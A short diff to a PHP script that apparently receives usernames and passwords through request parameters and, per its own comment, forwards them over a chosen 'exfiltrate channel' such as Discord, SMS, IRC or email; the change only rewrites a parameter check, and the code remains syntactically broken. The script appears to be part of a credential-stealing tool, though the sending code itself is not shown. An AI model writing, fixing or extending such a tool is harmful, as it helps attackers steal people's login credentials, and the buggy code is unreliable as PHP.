@@ -19,7 +19,7 @@ if($_GET['user'] and $_GET['password']){
     
         // TODO: choose the exfiltrate channel : Discord, SMS, IRC, email, ...
     
-        if(isset($_GET("chan")) && $_GET("chan")){
+        if(isset($_GET["chan"])!==null && $_GET["chan"]){
             $chan = $_GET("chan");
             switch($chan){
                 case 'SMS';
